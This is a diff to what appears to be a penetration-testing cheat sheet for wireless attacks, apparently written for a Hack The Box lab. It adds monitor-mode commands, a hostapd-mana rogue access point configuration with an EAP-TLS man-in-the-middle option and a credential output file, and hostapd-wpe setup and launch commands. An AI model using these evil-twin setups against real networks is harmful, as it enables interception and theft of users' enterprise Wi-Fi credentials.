@@ -207,6 +207,8 @@
 ```bash
 #Configure interface for first time use 
 ip link set wlan0 down
+iw dev wlan0 set type monitor
+#or 
 iwconfig wlan0 mode [monitor],[managed] 
 ip link set wlan0 up
 ```
@@ -396,6 +398,7 @@ ip link set wlan0 up
   wpa=3
   hw_mode=g
   ieee8021x=1
+  driver=nl80211
   
   # EAP Configuration
   eap_server=1
@@ -407,6 +410,8 @@ ip link set wlan0 up
   mana_credout=credentials.creds
   mana_eapsuccess=1
   mana_wpe=1
+  # EAP TLS MitM
+  mana_eaptls=1
   
   # Certificate Configuration
   ca_cert=ca.pem
@@ -439,12 +444,24 @@ ip link set wlan0 up
   #prompt will be for a challenge password.  Match what you have in the config above
   
   #server x509 cert
-  openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem#### 9. Hostapd-wpe
+  openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem
   ```
 
 ## 9. Hostapd-wpe
 
 ```bash
+#location of config file
+/etc/hostapd-wpe/hostapd-wpe.conf
+
+#things to change 
+interface=wlan1
+ssid=HTB-Corp
+channel=1
+```
+
+```bash
+#normal execution
+hostapd-wpe hostapd-wpe.conf 
 #exmple to start hostapd-wpe with attack options
 hostapd-wpe -c -k /etc/hostapd-wpe/hostapd-wpe.conf
 ```
